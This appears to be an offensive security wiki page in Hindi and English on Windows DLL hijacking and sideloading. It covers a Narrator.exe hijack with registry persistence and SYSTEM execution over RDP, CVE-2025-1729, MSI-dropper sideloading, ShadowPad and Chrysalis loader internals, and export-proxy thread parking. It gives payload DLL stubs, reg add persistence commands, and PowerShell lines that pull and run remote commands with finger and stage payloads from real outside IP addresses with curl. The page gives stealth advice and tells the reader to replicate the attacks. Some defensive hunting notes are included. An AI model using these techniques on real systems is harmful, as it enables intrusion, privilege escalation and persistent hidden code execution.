Windows Narrator.exe अभी भी start होने पर एक अनुमानित, language-specific localization DLL को probe करता है, जिसे arbitrary code execution और persistence के लिए hijack किया जा सकता है।<sup>[[7]](#references)</sup>

मुख्य तथ्य
- Probe path (current builds): `%windir%\System32\speech_onecore\engines\tts\msttsloc_onecoreenus.dll` (EN-US)।
- Legacy path (older builds): `%windir%\System32\speech\engine\tts\msttslocenus.dll`।
- यदि OneCore path पर attacker-controlled writable DLL मौजूद है, तो वह load हो जाती है और `DllMain(DLL_PROCESS_ATTACH)` execute होता है। किसी export की आवश्यकता नहीं होती।

Procmon से Discovery
- Filter: `Process Name is Narrator.exe` और `Operation is Load Image` या `CreateFile`।
- Narrator start करें और ऊपर दिए गए path को load करने के प्रयास को observe करें।

Minimal DLL
```c
// Build as msttsloc_onecoreenus.dll and place in the OneCore TTS path
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
if (r == DLL_PROCESS_ATTACH) {
// Optional OPSEC: DisableThreadLibraryCalls(h);
// Suspend/quiet Narrator main thread, then run payload
// (see PoC for implementation details)
}
return TRUE;
}
```
OPSEC में शांत रहें
- एक naive hijack बोलता है/ UI को highlight करता है। शांत रहने के लिए, attach करते समय Narrator threads को enumerate करें, main thread को (`OpenThread(THREAD_SUSPEND_RESUME)`) खोलें और उसे `SuspendThread` करें; अपने thread में जारी रखें। पूरे code के लिए PoC देखें।<sup>[[8]](#references)</sup>

Accessibility configuration के माध्यम से Trigger और persistence
- User context (HKCU): `reg add "HKCU\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- Winlogon/SYSTEM (HKLM): `reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- ऊपर दिए गए configuration के साथ, Narrator शुरू करने पर planted DLL load होती है। Secure desktop (logon screen) पर Narrator शुरू करने के लिए CTRL+WIN+ENTER दबाएँ; आपकी DLL secure desktop पर SYSTEM के रूप में execute होती है।

RDP-triggered SYSTEM execution (lateral movement)
- Classic RDP security layer allow करें: `reg add "HKLM\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v SecurityLayer /t REG_DWORD /d 0 /f`
- Host पर RDP करें, logon screen पर Narrator launch करने के लिए CTRL+WIN+ENTER दबाएँ; आपकी DLL secure desktop पर SYSTEM के रूप में execute होती है।
- RDP session बंद होने पर execution रुक जाता है—तुरंत inject/migrate करें।

Bring Your Own Accessibility (BYOA)
- आप किसी built-in Accessibility Tool (AT) registry entry (जैसे CursorIndicator) को clone कर सकते हैं, उसे किसी arbitrary binary/DLL की ओर point करने के लिए edit कर सकते हैं, फिर उसे import करके `configuration` को उस AT name पर set कर सकते हैं। यह Accessibility framework के अंतर्गत arbitrary execution को proxy करता है।

Notes
- `%windir%\System32` के अंतर्गत लिखने और HKLM values बदलने के लिए admin rights आवश्यक हैं।
- पूरा payload logic `DLL_PROCESS_ATTACH` में रह सकता है; किसी exports की आवश्यकता नहीं है।

## Case Study: CVE-2025-1729 - TPQMAssistant.exe का उपयोग करके Privilege Escalation

यह case Lenovo के TrackPoint Quick Menu (`TPQMAssistant.exe`) में **Phantom DLL Hijacking** को प्रदर्शित करता है, जिसे **CVE-2025-1729** के रूप में track किया गया है।<sup>[[2]](#references)[[3]](#references)</sup>

### Vulnerability का विवरण

- **Component**: `TPQMAssistant.exe`, जो `C:\ProgramData\Lenovo\TPQM\Assistant\` में स्थित है।
- **Scheduled Task**: `Lenovo\TrackPointQuickMenu\Schedule\ActivationDailyScheduleTask` रोज़ सुबह 9:30 बजे logged-on user के context में run होता है।
- **Directory Permissions**: `CREATOR OWNER` द्वारा writable है, जिससे local users arbitrary files drop कर सकते हैं।
- **DLL Search Behavior**: पहले अपने working directory से `hostfxr.dll` load करने का प्रयास करता है और missing होने पर "NAME NOT FOUND" log करता है, जो local directory search precedence को दर्शाता है।

### Exploit Implementation

एक attacker उसी directory में malicious `hostfxr.dll` stub रख सकता है और missing DLL का exploit करके user के context में code execution प्राप्त कर सकता है:
```c
#include <windows.h>

BOOL APIENTRY DllMain(HMODULE hModule, DWORD fdwReason, LPVOID lpReserved) {
if (fdwReason == DLL_PROCESS_ATTACH) {
// Payload: display a message box (proof-of-concept)
MessageBoxA(NULL, "DLL Hijacked!", "TPQM", MB_OK);
}
return TRUE;
}
```
### Attack Flow

1. एक standard user के रूप में `hostfxr.dll` को `C:\ProgramData\Lenovo\TPQM\Assistant\` में drop करें।
2. Scheduled task के current user's context में सुबह 9:30 बजे run होने की प्रतीक्षा करें।
3. यदि task execute होने के समय कोई administrator logged in है, तो malicious DLL administrator के session में medium integrity पर run होती है।
4. Medium integrity से SYSTEM privileges तक elevate करने के लिए standard UAC bypass techniques को chain करें।

## Case Study: MSI CustomAction Dropper + DLL Side-Loading via Signed Host (wsc_proxy.exe)

Threat actors payloads को trusted, signed process के अंतर्गत execute करने के लिए अक्सर MSI-based droppers को DLL side-loading के साथ pair करते हैं।<sup>[[10]](#references)</sup>

Chain overview
- User MSI download करता है। GUI install के दौरान एक CustomAction silently run होता है (जैसे LaunchApplication या VBScript action), जो embedded resources से next stage को reconstruct करता है।
- Dropper एक legitimate, signed EXE और एक malicious DLL को उसी directory में लिखता है (उदाहरण pair: Avast-signed wsc_proxy.exe + attacker-controlled wsc.dll)।
- जब signed EXE start होता है, तो Windows DLL search order working directory से पहले wsc.dll load करता है और signed parent के अंतर्गत attacker code execute करता है (ATT&CK T1574.001)।

MSI analysis (what to look for)
- CustomAction table:
- उन entries को खोजें जो executables या VBScript run करती हैं। Suspicious pattern का उदाहरण: LaunchApplication, जो background में embedded file execute करता है।
- Orca (Microsoft Orca.exe) में CustomAction, InstallExecuteSequence और Binary tables का निरीक्षण करें।
- MSI CAB में Embedded/split payloads:
- Administrative extract: msiexec /a package.msi /qb TARGETDIR=C:\out
- या lessmsi का उपयोग करें: lessmsi x package.msi C:\out
- ऐसे multiple छोटे fragments खोजें जिन्हें VBScript CustomAction द्वारा concatenate और decrypt किया जाता है। Common flow:
```vb
' VBScript CustomAction (high level)
' 1) Read multiple fragment files from the embedded CAB (e.g., f0.bin, f1.bin, ...)
' 2) Concatenate with ADODB.Stream or FileSystemObject
' 3) Decrypt using a hardcoded password/key
' 4) Write reconstructed PE(s) to disk (e.g., wsc_proxy.exe and wsc.dll)
```
Practical sideloading with wsc_proxy.exe
- इन दो files को एक ही folder में रखें:
- wsc_proxy.exe: वैध signed host (Avast)। यह process अपनी directory से नाम के आधार पर wsc.dll को load करने का प्रयास करता है।
- wsc.dll: attacker DLL। यदि किसी specific exports की आवश्यकता नहीं है, तो DllMain पर्याप्त हो सकता है; अन्यथा एक proxy DLL बनाएं और payload को DllMain में चलाते हुए आवश्यक exports को genuine library में forward करें।
- एक minimal DLL payload बनाएं:
```c
// x64: x86_64-w64-mingw32-gcc payload.c -shared -o wsc.dll
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
if (r == DLL_PROCESS_ATTACH) {
WinExec("cmd.exe /c whoami > %TEMP%\\wsc_sideload.txt", SW_HIDE);
}
return TRUE;
}
```
- Export requirements के लिए, एक proxying framework (जैसे DLLirant/Spartacus) का उपयोग करके forwarding DLL generate करें, जो आपके payload को भी execute करे।

- यह technique host binary द्वारा DLL name resolution पर निर्भर करती है। यदि host absolute paths या safe loading flags (जैसे LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories) का उपयोग करता है, तो hijack विफल हो सकता है।
- KnownDLLs, SxS और forwarded exports precedence को प्रभावित कर सकते हैं और host binary तथा export set चुनते समय इन पर विचार करना आवश्यक है।

## Signed triads + encrypted payloads (ShadowPad case study)

Check Point ने बताया कि Ink Dragon ShadowPad को legitimate software में मिलाने के लिए **three-file triad** का उपयोग करता है, जबकि core payload को disk पर encrypted रखता है:<sup>[[12]](#references)</sup>

1. **Signed host EXE** – AMD, Realtek या NVIDIA जैसे vendors का दुरुपयोग किया जाता है (`vncutil64.exe`, `ApplicationLogs.exe`, `msedge_proxyLog.exe`)। Attackers executable का नाम बदलकर उसे Windows binary जैसा दिखाते हैं (उदाहरण के लिए `conhost.exe`), लेकिन Authenticode signature valid रहती है।
2. **Malicious loader DLL** – EXE के साथ expected name (`vncutil64loc.dll`, `atiadlxy.dll`, `msedge_proxyLogLOC.dll`) से drop की जाती है। DLL आमतौर पर ScatterBrain framework से obfuscated MFC binary होती है; इसका एकमात्र काम encrypted blob को locate करना, उसे decrypt करना और ShadowPad को reflectively map करना है।
3. **Encrypted payload blob** – अक्सर उसी directory में `<name>.tmp` के रूप में stored होती है। Decrypted payload को memory-map करने के बाद loader forensic evidence नष्ट करने के लिए TMP file delete कर देता है।

Tradecraft notes:

* Signed EXE का नाम बदलने पर (PE header में मूल `OriginalFileName` रखते हुए) वह Windows binary का रूप ले सकता है और vendor signature भी बनाए रखता है। इसलिए Ink Dragon की उस आदत को दोहराएं जिसमें `conhost.exe` जैसे दिखने वाले binaries drop किए जाते हैं, जो वास्तव में AMD/NVIDIA utilities होते हैं।
* चूंकि executable trusted रहता है, इसलिए अधिकांश allowlisting controls में केवल आपकी malicious DLL का उसके साथ होना आवश्यक है। Loader DLL को customize करने पर ध्यान दें; signed parent आमतौर पर बिना बदलाव के चल सकता है।
* ShadowPad का decryptor अपेक्षा करता है कि TMP blob loader के साथ स्थित हो और writable हो, ताकि mapping के बाद वह file को zero कर सके। Payload load होने तक directory को writable रखें; memory में आने के बाद OPSEC के लिए TMP file को सुरक्षित रूप से delete किया जा सकता है।

### LOLBAS stager + staged archive sideloading chain (finger → tar/curl → WMI)

Operators DLL sideloading को LOLBAS के साथ pair करते हैं, ताकि disk पर एकमात्र custom artifact trusted EXE के साथ मौजूद malicious DLL हो:<sup>[[1]](#references)</sup>

- **Remote command loader (Finger):** Hidden PowerShell `cmd.exe /c` को spawn करता है, Finger server से commands pull करता है और उन्हें `cmd` को pipe करता है:

```powershell
powershell.exe Start-Process cmd -ArgumentList '/c finger Galo@91.193.19.108 | cmd' -WindowStyle Hidden
```
- `finger user@host` TCP/79 text pull करता है; `| cmd` server response को execute करता है, जिससे operators second stage को server-side rotate कर सकते हैं।

- **Built-in download/extract:** benign extension वाली archive download करें, उसे unpack करें और sideload target तथा DLL को random `%LocalAppData%` folder के अंतर्गत stage करें:

```powershell
$base = "$Env:LocalAppData"; $dir = Join-Path $base (Get-Random); curl -s -L -o "$dir.pdf" 79.141.172.212/tcp; mkdir "$dir"; tar -xf "$dir.pdf" -C "$dir"; $exe = "$dir\intelbq.exe"
```
- `curl -s -L` progress छिपाता है और redirects follow करता है; `tar -xf` Windows के built-in tar का उपयोग करता है।

- **WMI/CIM launch:** EXE को WMI के माध्यम से start करें, ताकि telemetry में CIM-created process दिखाई दे और वह colocated DLL load करे:

```powershell
Invoke-CimMethod -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine = "`"$exe`""}
```
- यह उन binaries के साथ काम करता है जो local DLLs को prefer करते हैं (जैसे `intelbq.exe`, `nearby_share.exe`); payload (जैसे Remcos) trusted name के अंतर्गत चलता है।

- **Hunting:** जब `/p`, `/m` और `/c` एक साथ दिखाई दें, तो `forfiles` पर alert करें; admin scripts के बाहर यह uncommon है।


## Case Study: NSIS dropper + Bitdefender Submission Wizard sideload (Chrysalis)

हाल के Lotus Blossom intrusion में trusted update chain का दुरुपयोग करके एक NSIS-packed dropper deliver किया गया, जिसने DLL sideload और पूरी तरह in-memory payloads को stage किया।<sup>[[13]](#references)</sup>

Tradecraft flow
- `update.exe` (NSIS) `%AppData%\Bluetooth` बनाता है, उसे **HIDDEN** mark करता है, renamed Bitdefender Submission Wizard `BluetoothService.exe`, malicious `log.dll` और encrypted blob `BluetoothService` drop करता है, फिर EXE launch करता है।
- Host EXE `log.dll` import करता है और `LogInit`/`LogWrite` call करता है। `LogInit` blob को mmap-load करता है; `LogWrite` उसे custom LCG-based stream (constants **0x19660D** / **0x3C6EF35F**, और prior hash से derived key material) से decrypt करता है, buffer को plaintext shellcode से overwrite करता है, temporary data free करता है और उस पर jump करता है।
- IAT से बचने के लिए loader export names को hashing करके APIs resolve करता है। इसमें FNV-1a basis 0x811C9DC5 + prime 0x100019 का उपयोग होता है, फिर Murmur-style avalanche (**0x85EBCA6B**) apply करके salted target hashes से compare किया जाता है।

Main shellcode (Chrysalis)
- PE-जैसे main module को key `gQ2JR&9;` के साथ पांच passes में repeating add/XOR/sub द्वारा decrypt करता है, फिर import resolution पूरा करने के लिए `Kernel32.dll` → `GetProcAddress` dynamically load करता है।
- Per-character bit-rotate/XOR transforms के माध्यम से runtime पर DLL name strings reconstruct करता है, फिर `oleaut32`, `advapi32`, `shlwapi`, `user32`, `wininet`, `ole32`, `shell32` load करता है।
- एक दूसरा resolver **PEB → InMemoryOrderModuleList** walk करता है, प्रत्येक export table को 4-byte blocks में Murmur-style mixing से parse करता है और hash न मिलने पर ही `GetProcAddress` पर fallback करता है।

Embedded configuration & C2
- Config dropped `BluetoothService` file के अंदर **offset 0x30808** (size **0x980**) पर रहती है और key `qwhvb^435h&*7` से RC4-decrypt होती है, जिससे C2 URL और User-Agent प्राप्त होते हैं।
- Beacons dot-delimited host profile बनाते हैं, उसके आगे tag `4Q` जोड़ते हैं, फिर HTTPS पर `HttpSendRequestA` से पहले key `vAuig34%^325hGV` द्वारा RC4-encrypt करते हैं। Responses RC4-decrypt किए जाते हैं और tag switch (`4T` shell, `4V` process exec, `4W/4X` file write, `4Y` read/exfil, `4\\` uninstall, `4` drive/file enum + chunked transfer cases) द्वारा dispatch किए जाते हैं।
- Execution mode CLI args द्वारा gated है: no args = `-i` की ओर संकेत करने वाली install persistence (service/Run key); `-i` self को `-k` के साथ relaunch करता है; `-k` install skip करके payload run करता है।

Alternate loader observed
- उसी intrusion में Tiny C Compiler drop किया गया और `C:\ProgramData\USOShared\` से `svchost.exe -nostdlib -run conf.c` execute किया गया, जिसके साथ `libtcc.dll` मौजूद थी। Attacker-supplied C source में shellcode embedded था, जिसे compile करके in-memory run किया गया और PE के रूप में disk को touch नहीं किया गया। इसे इस प्रकार replicate करें:
```cmd
C:\ProgramData\USOShared\tcc.exe -nostdlib -run conf.c
```
- इस TCC-based compile-and-run stage ने runtime पर `Wininet.dll` import किया और hardcoded URL से second-stage shellcode प्राप्त किया, जिससे ऐसा flexible loader मिला जो compiler run का रूप लेता है।

## Signed-host sideloading with export proxying + host thread parking

कुछ DLL sideloading chains में **stability engineering** जोड़ी जाती है, ताकि legitimate host बाद के stages को बिना crash हुए ठीक से load करने के लिए पर्याप्त समय तक alive रहे।<sup>[[11]](#references)</sup>

Observed pattern
- एक trusted EXE को malicious DLL के साथ रखें और अपेक्षित dependency name, जैसे `version.dll`, का उपयोग करें।
- malicious DLL **हर expected export को** real system DLL, जैसे `%SystemRoot%\\System32\\version.dll`, पर proxy करता है, ताकि import resolution सफल रहे और host process काम करता रहे।
- Load होने के बाद malicious DLL **host entry point को patch** करता है, ताकि main thread exit होने या process को terminate करने वाले code paths चलाने के बजाय infinite `Sleep` loop में चला जाए।
- एक नया thread वास्तविक malicious work करता है: next-stage DLL name या path को decrypt करता है (`RC4`/`XOR` सामान्य हैं), फिर उसे `LoadLibrary` से launch करता है।

Why this matters
- सामान्य DLL proxying API compatibility बनाए रखती है, लेकिन यह सुनिश्चित नहीं करती कि host बाद के stages के लिए पर्याप्त समय तक alive रहेगा।
- `Sleep(INFINITE)` में main thread को park करना signed process को resident बनाए रखने का सरल तरीका है, जबकि loader worker thread में decryption, staging या network bootstrap करता है।
- केवल suspicious `DllMain` की तलाश करने पर यह pattern छूट सकता है, यदि महत्वपूर्ण behavior host entry point patch होने और secondary thread शुरू होने के बाद होता है।

Minimal workflow
1. Signed host EXE को copy करें और निर्धारित करें कि वह local directory से कौन-सी DLL resolve करता है।
2. समान functions export करने वाली और उन्हें legitimate DLL पर forward करने वाली proxy DLL बनाएं।
3. `DllMain(DLL_PROCESS_ATTACH)` में एक worker thread बनाएं।
4. उस thread से host entry point या main thread start routine को patch करें, ताकि वह `Sleep` पर loop करता रहे।
5. Next-stage DLL name/config को decrypt करें और `LoadLibrary` call करें या payload को manual-map करें।

Defensive pivots
- ऐसे signed processes जो `version.dll` या इसी प्रकार की common libraries को `System32` के बजाय अपनी application directory से load करते हैं।
- Image load के तुरंत बाद process entry point पर memory patches, विशेष रूप से ऐसे jumps/calls जो `Sleep`/`SleepEx` पर redirect किए गए हों।
- Proxy DLL द्वारा बनाए गए ऐसे threads जो तुरंत decrypted name वाली दूसरी DLL पर `LoadLibrary` call करते हैं।
- Writable staging directories, जैसे `ProgramData`, `%TEMP%` या unpacked archive paths के अंदर vendor executables के पास रखी गई full-export proxy DLLs।

## References

- [1] [Red Canary – Intelligence Insights: जनवरी 2026](https://redcanary.com/blog/threat-intelligence/intelligence-insights-january-2026/)
- [2] [CVE-2025-1729 - TPQMAssistant.exe का उपयोग करके Privilege Escalation](https://trustedsec.com/blog/cve-2025-1729-privilege-escalation-using-tpqmassistant-exe)
- [3] [Microsoft Store - TPQM Assistant UWP](https://apps.microsoft.com/detail/9mz08jf4t3ng)
- [4] [Pranay Bafna – TCAPT: DLL Hijacking](https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e)
- [5] [cocomelonc – Windows में DLL hijacking। Simple C example।](https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html)
- [6] [Check Point Research – Nimbus Manticore ने Europe को Target करने वाला नया Malware Deploy किया](https://research.checkpoint.com/2025/nimbus-manticore-deploys-new-malware-targeting-europe/)
- [7] [TrustedSec – Hack-cessibility: जब DLL Hijacks का सामना Windows Helpers से होता है](https://trustedsec.com/blog/hack-cessibility-when-dll-hijacks-meet-windows-helpers)
- [8] [PoC – api0cradle/Narrator-dll](https://github.com/api0cradle/Narrator-dll)
- [9] [Sysinternals Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [10] [Unit 42 – Digital Doppelgangers: Gh0st RAT वितरित करने वाले Evolving Impersonation Campaigns का Anatomy](https://unit42.paloaltonetworks.com/impersonation-campaigns-deliver-gh0st-rat/)
- [11] [Unit 42 – Converging Interests: Southeast Asian Government को Target करने वाले Threat Clusters का Analysis](https://unit42.paloaltonetworks.com/espionage-campaigns-target-se-asian-government-org/)
- [12] [Check Point Research – Inside Ink Dragon: Stealthy Offensive Operation के Relay Network और Inner Workings का खुलासा](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)
- [13] [Rapid7 – The Chrysalis Backdoor: Lotus Blossom के toolkit का Deep Dive](https://www.rapid7.com/blog/post/tr-chrysalis-backdoor-dive-into-lotus-blossoms-toolkit)
- [14] [0xdf – HTB Bruno ZipSlip → DLL hijack chain](https://0xdf.gitlab.io/2026/02/24/htb-bruno.html)
- [15] [Unit 42 – Iranian APT Screening Serpens की 2026 Espionage Campaigns की Tracking](https://unit42.paloaltonetworks.com/tracking-iran-apt-screening-serpens/)
- [16] [Microsoft Learn – `<appDomainManagerAssembly>` element](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/appdomainmanagerassembly-element)
- [17] [Microsoft Learn – `<appDomainManagerType>` element](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/appdomainmanagertype-element)
- [18] [Microsoft Learn – `<probing>` element](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/probing-element)
- [19] [Microsoft Learn – `<bypassTrustedAppStrongNames>` element](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/bypasstrustedappstrongnames-element)
- [20] [Microsoft Learn – `<publisherPolicy>` element](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/publisherpolicy-element)
- [21] [Microsoft Learn – `<requiredRuntime>` element](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/startup/requiredruntime-element)
- [22] [Check Point Research – Fast and Furious: Iranian Conflict के दौरान Nimbus Manticore Operations](https://research.checkpoint.com/2026/fast-and-furious-nimbus-manticore-operations-during-the-iranian-conflict/)
- [23] [Microsoft Learn – Task Actions](https://learn.microsoft.com/en-us/windows/win32/taskschd/task-actions)
- [24] [MITRE ATT&CK – T1574.014 AppDomainManager](https://attack.mitre.org/techniques/T1574/014/)
- [25] [Unit 42 – CL-STA-1062 ने Southeast Asian Governments और Critical Infrastructure को Target किया](https://unit42.paloaltonetworks.com/cl-sta-1062-tinyrct-backdoor/)
{{#include ../../../banners/hacktricks-training.md}}
